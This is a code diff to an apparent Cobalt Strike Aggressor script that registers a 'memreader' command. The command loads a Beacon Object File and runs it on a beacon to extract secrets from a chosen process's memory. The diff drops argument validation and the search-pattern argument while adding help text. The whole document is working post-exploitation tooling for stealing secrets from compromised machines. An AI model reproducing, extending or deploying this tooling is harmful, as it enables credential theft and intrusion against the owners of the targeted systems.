@@ -1,25 +1,23 @@
+#register help
+beacon_command_register("memreader", "Beacon Object File to Extract secrets from process memory",
+        "Synopsis: memreader <PID> <return value size>\n" .
+        "Beacon Object File to Extract secrets from process memory.\n");
+
 alias memreader {
 
         # Alias for Beacon ID and args
     local('$bid $pid $pattern $size');
     
     # Set the number of arguments
-    ($bid, $pid, $pattern, $size) = @_;
-
-        # Determine the amount of arguments
-    if (size(@_) != 4)
-    {
-        berror($bid, "Usage : memreader <target-pid> <pattern> <output-size>");
-                return;
-    }
+    ($bid, $pid, $size, $pattern) = @_;
 
     # Read in the BOF
     $handle = openf(script_resource("memreader.o"));
     $data = readb($handle, -1);
     closef($handle);
 
-    $args = bof_pack($bid , "izi", $pid, $pattern, $size);
-
+    $args = bof_pack($bid , "ii", $pid, $size);
+    
     # Run the BOF
     # go = Entry point of the BOF
     beacon_inline_execute($bid, $data, "go", $args);
